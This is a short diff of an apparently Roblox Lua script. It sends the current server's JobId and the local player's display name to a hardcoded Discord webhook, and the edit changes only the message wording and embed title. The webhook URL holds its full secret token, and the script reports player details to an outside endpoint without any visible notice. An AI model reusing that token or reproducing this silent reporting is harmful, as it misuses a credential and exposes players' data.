@@ -10,10 +10,10 @@ local webhookcheck =
 local url =
    "https://discord.com/api/webhooks/1148392381922676868/MZ1NWtfVtcEK-nsLwB47v15qvZmpESMyLSpW9G9CttOtflVZOvj0QnOuTsanA9KK6kfw"
 local data = {
-   ["content"] = "JobID: **" .. game.JobId .. "**",
+   ["content"] = "Joined JobID: **" .. game.JobId .. "** For 200 Second(s)",
    ["embeds"] = {
        {
-           ["title"] = "the wok famiry",
+           ["title"] = "the wok famiry 🉐㊗💮🉐㊙🉑🈶🈹🈚🈸🈺🆚🈷🈺🈷🈴🈲🅱",
            ["description"] = "DisplayName: [ " .. game.Players.LocalPlayer.DisplayName.." ] with **"..webhookcheck.."**",
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
